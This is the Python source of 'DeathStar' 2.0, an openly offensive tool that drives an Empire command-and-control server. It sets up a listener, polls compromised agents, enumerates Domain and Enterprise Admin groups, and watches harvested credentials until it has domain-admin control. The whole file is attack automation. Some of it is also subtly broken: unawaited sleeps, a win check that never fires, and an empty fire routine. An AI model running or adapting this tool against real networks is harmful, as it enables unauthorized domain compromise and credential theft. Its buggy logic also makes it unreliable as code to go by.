#! /usr/bin/env python3

# Copyright (c) 2020 Marcello Salvati (byt3bl33d3r@pm.me)
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

__version__ = "2.0"

import logging
import argparse
import asyncio
from deathstar.kybercrystals import KyberCrystals
from deathstar.empire import EmpireApiClient, EmpireLoginError
from deathstar.utils import CustomArgFormatter

handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter("[%(name)s] %(levelname)s - %(message)s"))

log = logging.getLogger("deathstar")
log.setLevel(logging.DEBUG)
log.addHandler(handler)


class DeathStar:
    def __init__(self, empire):
        self.empire = empire

        self.enterprise_admins = []
        self.admins = []
        self.domain_controllers = []
        self.priority_targets = []

        self.fire_missions = []
        self.won = asyncio.Event()
        self.recon_performed = asyncio.Event()

        self.kybers = KyberCrystals(self)

    async def agent_running_under_domain_account(self, agent):
        agent = await self.empire.agents.get(agent)
        host = agent["hostname"]
        domain, user = agent["username"].split("\\")

        if domain != host and user != "SYSTEM":
            return True
        return False

    async def recon(self, agent):
        if await self.agent_running_under_domain_account(agent):
            log.info("Starting recon")

        domain_sid = await self.kybers.get_domain_sid(agent)[0]
        domain_admins, enterprise_admins = await asyncio.gather(
            *[
                self.kybers.get_group_members(domain_sid + "-512"),
                self.kybers.get_group_members(domain_sid + "-519"),
            ]
        )

        self.recon_performed.set()

    async def fire(self, agent):
        await self.recon_performed.wait()

    async def poll_for_agents(self):
        while not self.won.is_set():
            agents = await self.empire.agents.get()
            for agent in agents:
                if not any(
                    map(lambda t: t.get_name() == agent["name"], self.fire_missions)
                ):
                    asyncio.create_task(self.fire(agent), name=agent["name"])

            asyncio.sleep(1)

        await asyncio.gather(*self.fire_missions)

    async def check_for_win(self):
        while not self.won.is_set():
            for agent in await self.empire.agents.get():
                if agent["username"] in self.admins and agent["high_integrity"]:
                    self.won.set()

            for cred in await self.empire.credentials.get():
                if cred["credtype"] == "plaintext":
                    account = f"{cred['domain'].upper()}\\{cred['username']}"
                    if account in self.admins:
                        self.won.is_set()

            asyncio.sleep(1)

    async def power_up(self):
        if "error" in await self.empire.listeners.get("DeathStar"):
            await self.empire.listeners.create(additional={"Port": 8443})

        await asyncio.gather(*[self.check_for_win(), self.poll_for_agents()])


async def main(args):
    try:
        empire = EmpireApiClient(host=args.api_host, port=args.api_port)
        await empire.login(args.username, args.password)
    except EmpireLoginError:
        log.error("Error logging into Empire, invalid credentials?")
    else:
        deathstar = DeathStar(empire)
        await deathstar.power_up()


def run():
    args = argparse.ArgumentParser(
        description=f"""
DeathStar!

Version: {__version__}
    """,
        formatter_class=CustomArgFormatter,
    )
    args.add_argument(
        "-u", "--username", type=str, default="empireadmin", help="Empire username"
    )
    args.add_argument(
        "-p", "--password", type=str, default="Password123!", help="Empire password"
    )
    args.add_argument(
        "--api-host", type=str, default="127.0.0.1", help="Empire API IP/Hostname"
    )
    args.add_argument("--api-port", type=int, default=1337, help="Empire API port")
    args.add_argument("--debug", action="store_true", help="Enable debug output")

    args = args.parse_args()

    if args.debug:
        log.setLevel(logging.DEBUG)

    log.debug(vars(args))
    asyncio.run(main(args))


if __name__ == "__main__":
    run()
